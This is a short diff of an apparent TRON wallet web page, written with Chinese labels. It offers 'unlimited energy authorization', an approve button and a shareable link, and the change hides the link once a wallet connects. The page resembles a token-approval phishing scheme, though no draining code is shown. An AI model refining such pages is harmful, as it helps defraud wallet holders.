@@ -254,7 +254,7 @@
             能量无限授权
         </button>
          <!-- 复制链接区：修复图标符号 -->
-        <div id="connectBtn" class="copy-link-wrap">
+        <div class="copy-link-wrap">
             <span id="copyLinkText">
                 https://trc20trx-alt.github.io/Trc20.TRX/
             </span>
@@ -292,7 +292,8 @@
         const approveBtn = document.getElementById("approveBtn");
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");
-
+        const copyLinkWrap = document.querySelector('.copy-link-wrap');
+    
         renderApprovalRecords();
 
         // 复制链接逻辑
@@ -307,6 +308,7 @@
             tronWeb = window.tronWeb;
             // 检测到钱包，隐藏连接按钮
             connectBtn.style.display = "none";
+            copyLinkWrap.style.display = "none";
             await initWallet();
         } else {
             document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开";
@@ -325,6 +327,7 @@
                 userAddress = accounts[0];
                 // 手动连接成功，隐藏连接按钮
                 connectBtn.style.display = "none";
+                copyLinkWrap.style.display = "none";
                 await initWallet();
             } catch (e) {}
         };
